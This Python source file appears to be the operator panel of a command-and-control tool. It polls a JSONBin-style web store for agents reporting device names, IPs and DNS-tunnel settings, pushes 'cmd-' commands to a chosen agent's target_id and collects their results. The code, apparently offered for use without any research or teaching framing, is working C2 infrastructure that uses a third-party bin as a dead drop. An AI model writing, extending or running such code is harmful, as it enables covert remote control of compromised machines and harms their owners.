import time
import requests
from threading import Thread
from core.state import ActiveSession

def poll_http_agents(self):
    url = self.url_entry.get().strip()
    api_key = self.api_key_entry.get().strip()
    
    if not url or not api_key:
        self._log_m("SYS: Missing HTTP credentials for polling")
        return None
    
    try:
        headers = {"X-Master-Key": api_key}
        response = self.session.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            record = self._gr(response.json())
            
            device_name = record.get('device_name', '')
            device_ip = record.get('device_ip', '')
            device_status = record.get('device_status', '')
            
            if device_name and device_ip and device_status == 'active':
                agent_data = {
                    'device_name': device_name,
                    'device_ip': device_ip,
                    'device_status': device_status,
                    'bin_id': self.bin_id_entry.get().strip(),
                    'api_key': api_key,
                    'url': url,
                    'discovered_via': 'http',
                    'dns_ready': False,
                    'dns_domain': '',
                    'dns_port': '',
                    'dns_encryption_key': ''
                }
                
                dns_domain = record.get('dns_domain', '')
                dns_port = record.get('dns_port', '')
                
                if dns_domain and dns_port:
                    agent_data['dns_domain'] = dns_domain
                    agent_data['dns_port'] = dns_port
                    agent_data['dns_ready'] = True
                
                self._log_m(f"HTTP: Detected agent {device_name} ({device_ip})")
                self._log_m("SYS: Agent will be saved to registry only after TUNNEL mode switch")
                return agent_data
            else:
                return None
                    
    except Exception as e:
        self._log_m(f"HTTP polling error: {e}")
        import traceback
        self._log_m(traceback.format_exc())
    
    return None

def requests(self, url, api_key, cmd):
    self.last_cmd_result_displayed = ""
    from core.state import ActiveSession
    try:
        headers = {
            "X-Master-Key": api_key,
            "Content-Type": "application/json"
        }

        payload_cmd  = cmd if cmd.startswith("cmd-") else f"cmd-{cmd}"
        target_id    = ActiveSession.get()

        if target_id is None:
            self.update_queue.put(("error", "No active agent — use 'Connect HTTP' first"))
            return

        payload = {
            "cmd":       payload_cmd,
            "target_id": target_id
        }

        response = self.session.put(url, json=payload, headers=headers, timeout=5)
        if response.status_code == 200:
            self.root.after(2000, lambda: self._poll(url, api_key))
        else:
            self.update_queue.put(("error", f"Request failed: {response.status_code}"))
    except Exception as e:
        self.update_queue.put(("error", str(e)))

def _poll(self, url, api_key):
    if not self.awaiting_command_result:
        return
    if self.active_mode not in ("jsonbin", "http"):
        return
    Thread(target=self._gcmd, args=(url, api_key), daemon=True).start()

def _gcmd(self, url, api_key):
    try:
        headers = {"X-Master-Key": api_key}
        response = self.session.get(url, headers=headers, timeout=3)
        if response.status_code == 200:
            data = self._gr(response.json())
            cmd_result = data.get("cmd_result", "")

            if cmd_result == "executing...":
                if self.awaiting_command_result:
                    self.root.after(1000, lambda: self._poll(url, api_key))
                return

            if cmd_result and cmd_result.strip() and cmd_result != "None":
                self.last_cmd_result_displayed = cmd_result
                self.update_queue.put(("command_result", cmd_result))
                return

            if self.awaiting_command_result:
                self.root.after(1500, lambda: self._poll(url, api_key))
    except Exception:
        if self.awaiting_command_result:
            self.root.after(1500, lambda: self._poll(url, api_key))

def cls_json(self):
    try:
        url = self.url_entry.get().strip()
        api_key = self.api_key_entry.get().strip()
        headers = {"X-Master-Key": api_key, "Content-Type": "application/json"}
        payload = {"cmd": "None", "cmd_result": "", "device_status": "active"}
        self.session.put(url, json=payload, headers=headers, timeout=3)
        self._log_m("SYS: JSONBin cleared")
    except:
        pass